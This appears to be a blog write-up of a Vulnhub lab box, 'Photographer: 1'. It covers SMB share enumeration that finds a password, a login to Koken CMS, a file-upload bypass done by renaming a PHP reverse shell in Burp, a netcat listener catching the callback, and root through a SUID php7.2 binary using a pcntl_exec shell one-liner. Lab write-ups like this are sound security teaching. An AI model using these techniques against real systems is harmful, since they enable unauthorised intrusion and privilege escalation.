---
layout: "post"
title: " Photographer: 1 Vulnhub Writeup"
categories: [vulnhub, OSCP-Like]
tags: [medium, koken, smb, suid, php7.2]
---
Photographer is an OSCP-like box. We found initial credentials for the Koken CMS by enumerating SMB shares. We upload a malicious php file to get a shell. In-home directory of daisa we found the user flag. We get root access by exploiting the php7.2 binary.

# Summary
- Portscan
- Finding SMB Shares
- Logging to Koken CMS
- Getting shell via File Upload Vulnerability.
- User Flag
- SUID
- Root Flag

# Portscan 
```
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Koken API error
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: Host: PHOTOGRAPHER

Host script results:
|_clock-skew: mean: 1h19m27s, deviation: 2h18m33s, median: -32s
|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: photographer
|   NetBIOS computer name: PHOTOGRAPHER\x00
|   Domain name: \x00
|   FQDN: photographer
|_  System time: 2020-07-27T11:29:36-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-07-27T15:29:37
|_  start_date: N/A
```
# Website on Port 80
I don’t see any links or any html comments that might indicate what to do next
![mainpage](/assets/img/photographer/mainpage.png)

# SMB recon
I use `smbmap` to findout the shares which we can access without credentials.
```
$smbmap -H 192.168.1.7
[+] Guest session   	IP: 192.168.1.7:445	Name: 192.168.1.7                                       
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	sambashare                                        	READ ONLY	Samba on Ubuntu
	IPC$                                              	NO ACCESS	IPC Service (photographer server (Samba, Ubuntu))
```
We can access `sambashare` share.
```
$smbclient //192.168.1.7/sambashare
Enter WORKGROUP\hitesh's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul 21 07:00:07 2020
  ..                                  D        0  Tue Jul 21 15:14:25 2020
  mailsent.txt                        N      503  Tue Jul 21 06:59:40 2020
  wordpress.bkp.zip                   N 13930308  Tue Jul 21 06:52:23 2020

		278627392 blocks of size 1024. 264268400 blocks available
smb: \> get mailsent.txt
getting file \mailsent.txt of size 503 as mailsent.txt (6.1 KiloBytes/sec) (average 6.1 KiloBytes/sec)
smb: \> get wordpress.bkp.zip 
getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (31345.2 KiloBytes/sec) (average 26467.5 KiloBytes/sec)
```
Now we have two files `mailsent.txt` and `wordpress.bkp.zip`. The `mailsent.txt` have interesting information two emails address and one possible password.
```
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)

```
```
Emails:
    agi@photographer.com(agi)
    daisa@photographer.com(daisa)
Password:
    babygirl
```
# Website on Port 8000
Server running `Koken CMS` on port 8000. Koken CMS is a free website publishing system developed for photographers.
![koken](/assets/img/photographer/koken.png)

## Accessing Koken Admin Panel
`/admin` contain Sign In page.

![login](/assets/img/photographer/login.png)

Here I tried to log in with creds which we found in `mailsent.txt` and succeed.
```
email : daisa@photographer.com
pass  : babygirl
```
## Getting Shell
In Koken we can upload the images. So try to upload shell on the server. Using `Import Content` which is at the bottom right-hand side.
![import](/assets/img/photographer/import.png)
I saved php-reverse-shell.php with name rev.php.jpg on local machine.

Open Koken CMS Dashboard, upload `rev.php.jpg` using `Import Content` button and Intercep request in burp.

![upload](/assets/img/photographer/upload.png)

On burp, rename file with `rev.php` and sent the request. 

![burp1](/assets/img/photographer/burp1.png)
![burp2](/assets/img/photographer/burp2.png)


On Koken CMS Library, select you file and put the mouse on "Download File" to see where your file is hosted on server.
![link](/assets/img/photographer/link.png)
```
curl http://192.168.1.7:8000/storage/originals/43/80/rev.php
```

```
┌─[hitesh@parrot]─[~/boxes/vulnhub/photographer]
└──╼ $nc -nvlp 8888
listening on [any] 8888 ...
connect to [192.168.1.2] from (UNKNOWN) [192.168.1.7] 43852
Linux photographer 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 01:49:04 up 33 min,  0 users,  load average: 1.13, 1.25, 2.22
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@photographer:/$ ^Z
[1]+  Stopped                 nc -nvlp 8888
┌─[✗]─[hitesh@parrot]─[~/boxes/vulnhub/photographer]
└──╼ $stty raw -echo
┌─[hitesh@parrot]─[~/boxes/vulnhub/photographer]
└──╼ $nc -nvlp 8888

www-data@photographer:/$ export TERM=xterm
www-data@photographer:/$ 
```
# User Flag
In home directory of `daisa` we get `user flag`.
```
www-data@photographer:/home/daisa$ cat user.txt 
d41d8cd98f00b204e9800998ecf8427e
```
# Privsec 
Looking at SUID files, `/usr/bin/php7.2` seem suspicious to me.
```
www-data@photographer:/tmp$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/php7.2
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/bin/ntfs-3g
/bin/ping
/bin/fusermount
/bin/mount
/bin/ping6
/bin/umount
/bin/su
```
[GTFObins](https://gtfobins.github.io/gtfobins/php/) help me to get shell.
![gtfo](/assets/img/photographer/gtfo.png)
```
www-data@photographer:/tmp$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
#
```

# Root Flag
```
# cat proof.txt
                                                                   
                                .:/://::::///:-`                                
                            -/++:+`:--:o:  oo.-/+/:`                            
                         -++-.`o++s-y:/s: `sh:hy`:-/+:`                         
                       :o:``oyo/o`. `      ```/-so:+--+/`                       
                     -o:-`yh//.                 `./ys/-.o/                      
                    ++.-ys/:/y-                  /s-:/+/:/o`                    
                   o/ :yo-:hNN                   .MNs./+o--s`                   
                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s                   
                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/                  
                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h                  
                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s.                 
                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +-                 
                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o.                 
                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h`                 
                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o                  
                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`                  
                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-                   
                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.                    
                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`                     
                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-                       
                        ./+:`:yh:dso/.+-++++ss+h++.:++-                         
                           -/+/-:-/y+/d:yh-o:+--/+/:`                           
                              `-///////////////:`                               
                                                                                

Follow me at: http://v1n1v131r4.com


d41d8cd98f00b204e9800998ecf8427e
```
